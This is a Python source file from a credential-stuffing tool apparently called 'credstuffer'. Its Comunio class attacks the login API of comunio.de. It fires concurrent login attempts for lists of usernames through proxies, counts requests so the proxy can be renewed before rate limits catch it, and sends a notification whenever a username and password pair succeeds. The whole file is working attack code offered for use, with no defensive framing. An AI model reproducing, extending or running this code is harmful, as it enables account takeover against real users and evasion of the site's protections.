import logging
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from credstuffer import UserAccount
from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError


class Comunio(UserAccount):
    """ class Comunio to provide basic methods for credstuffing comunio.de

    USAGE:
            comunio = Comunio(max_requests=10000, notify='mail', **kwargs)

    """
    usernames = list()

    def __init__(self, max_requests=10000, notify=None, **kwargs):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Comunio')
        self.name = 'Comunio'

        # init base class
        super().__init__(name=self.name, notify=notify, **kwargs)

        self.headers.update({
            'Origin': 'http://www.comunio.de',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'http://www.comunio.de/home',
            })
        self.comunio_login_url = 'https://api.comunio.de/login'
        self.max_requests = max_requests
        self.request_counter = 0

    def set_usernames(self, usernames):
        """ sets usernames for comunio account

        :param usernames: list of usernames
        """
        if isinstance(usernames, list):
            self.usernames.extend(usernames)
        else:
            self.usernames.append(usernames)

    def login(self, password):
        """ requests given login data to the account

        """

        # check if proxy is set
        if self.session.proxies:

            # check if we need a new proxy
            if self.request_counter < self.max_requests:

                with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:

                    future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
                    for i, future in enumerate(as_completed(future_response)):
                        user = future_response[future]
                        statuscode = future.result().status_code

                        if (self.request_counter % len(self.usernames)) == 0:
                            self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
                                         .format(statuscode, user, password, self.session.proxies['http']))

                        if statuscode == 200:
                            self.send_notification(username=user, password=password)
                        if statuscode == 500:
                            self.logger.error(future.result().text)
            else:
                # raise Error to renew Proxy
                self.request_counter = 0
                self.logger.error("Max number of proxy requests reached!. Renew Proxy")
                raise ProxyMaxRequestError("Max number of proxy requests reached!")
        else:
            raise ProxyNotSetError("No Proxy was set!")

    def __request_login(self, username, password):
        """ request login with an session object

        :return: Request response object
        """
        login_form = [('username', username), ('password', password), ]

        try:
            request_login = self.session.post(self.comunio_login_url, headers=self.headers, data=login_form,
                                              timeout=self.login_request_timeout, allow_redirects=False)
            
            self.request_counter += 1
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as e:
            # self.logger.error(e)
            raise ProxyBadConnectionError("Proxy Bad Connection")

        except requests.exceptions.RequestException as e:
            raise ProxyBadConnectionError("Proxy Bad Connection")

        return request_login

    def set_proxy(self, proxy):
        """ sets a proxy

        """
        if isinstance(proxy, dict):
            self.logger.info("set proxy to {}".format(proxy['http']))
            self.session.proxies = proxy
        else:
            raise TypeError("proxy must be type of dictionary!")
